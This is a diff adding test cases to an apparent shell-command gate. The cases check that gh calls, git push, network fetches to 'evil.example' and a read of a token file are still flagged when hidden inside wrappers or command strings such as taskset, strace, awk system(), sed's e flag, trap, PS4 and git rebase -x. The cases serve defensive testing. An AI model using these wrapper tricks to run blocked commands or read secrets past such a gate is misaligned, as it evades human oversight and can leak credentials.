@@ -1155,3 +1155,29 @@ case("git_ssh_command_and_editor_env", ["cmd-gh", "cmd-network"], bash(
 case("fp_assignment_values_own_and_plain", [], bash(
     "TMPDIR=%s/tmp PYTHONPATH=gate GIT_PAGER=cat git log -3; export TMPDIR=%s/tmp; env LC_ALL=C PAGER=less sort src/x; "
     "GIT_EDITOR=true git commit -q -m x; PATH=/usr/bin:/bin:%s/bin make" % (SC, SC, SC)))
+
+# -- T057 (R008 #11): wrappers that hide a command, and builtins/tools that take a command string -------------------
+case("wrap_taskset_gh", ["cmd-gh"], bash("taskset -c 0 gh api user"))
+case("wrap_taskset_mask_positional", ["cmd-network"], bash("taskset 0x1 curl http://evil.example"))
+case("wrap_strace_push", ["cmd-git-push"], bash("strace -f -o /dev/null git push origin HEAD"))
+case("wrap_unshare_curl", ["cmd-network"], bash("unshare -r curl http://evil.example"))
+case("wrap_chrt_and_chroot", ["cmd-network", "cmd-gh"], bash("chrt -r 50 curl http://evil.example; chroot /var/tmp/cache/T099/r gh api user"))
+case("wrap_numactl_and_prlimit", ["cmd-gh"], bash("numactl --cpunodebind=0 prlimit --nofile=1024 gh api user"))
+case("wrap_busybox_wget", ["cmd-network"], bash("busybox wget -qO- http://evil.example/x"))
+case("string_script_c_gh", ["cmd-gh"], bash("script -qc 'gh api user' /dev/null"))
+case("string_flock_c_gh", ["cmd-gh"], bash("flock /var/tmp/cache/T099/l -c 'gh api user'"))
+case("string_trap_gh", ["cmd-gh"], bash("trap 'gh api user' EXIT"))
+case("string_coproc_gh", ["cmd-gh"], bash("coproc gh api user"))
+case("string_awk_system_gh", ["cmd-gh"], bash("awk 'BEGIN{system(\"gh api user\")}'"))
+case("string_awk_system_read_secret", [S], bash("awk 'BEGIN{system(\"cat /var/tmp/.config/club/token\")}' < /dev/null"))
+case("string_sed_e_gh", ["cmd-gh"], bash("sed -n '1e gh api user' src/x.c"))
+case("string_ps4_gh", ["cmd-gh"], bash("PS4='$(gh api user)' bash -xc :"))
+case("string_parallel_gh", ["cmd-gh"], bash("parallel ::: 'gh api user'"))
+case("string_parallel_template_push", ["cmd-git-push"], bash("parallel 'git push origin {}' ::: main dev"))
+case("string_rebase_exec_gh", ["cmd-gh"], bash("git rebase -x 'gh api user' HEAD~1"))
+case("string_bisect_run_network", ["cmd-network"], bash("git bisect run curl http://evil.example"))
+case("string_submodule_foreach_push", ["cmd-git-push"], bash("git submodule foreach 'git push origin HEAD'"))
+case("fp_benign_wrappers_and_strings", [], bash(
+    "timeout 300 python3 -I tools/x.py; nice -n 10 tools/buck2 build //...; taskset -c 0-3 make -j4; "
+    "strace -f -o %s/trace.log tools/buck2 test //gate/...; T=%s/t.tmp; trap 'rm -f \"$T\"' EXIT; "
+    "parallel 'bash selftest/gate.sh {}' ::: a b; git rebase -x 'bash selftest/gate.sh' HEAD~2" % (SC, SC)))
